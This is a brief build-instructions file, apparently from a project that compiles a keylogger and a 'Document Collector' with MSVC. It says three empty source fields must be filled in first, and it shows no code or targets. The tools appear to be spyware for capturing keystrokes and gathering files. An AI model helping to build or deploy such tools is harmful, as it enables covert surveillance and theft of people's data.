# Build Commands
*Use MSVC Developer Command Prompt*
-----Keylogger-----
cl /std:c++20 /EHsc /W4 /DUNICODE /D_UNICODE source\keylogger\keylogger.cpp user32.lib kernel32.lib

-----Document Collector-----
*Fill in 3 empty fields in source code first*
cl /std:c++20 /EHsc /W4 /DUNICODE /D_UNICODE source\document-collector\document_collector.cpp
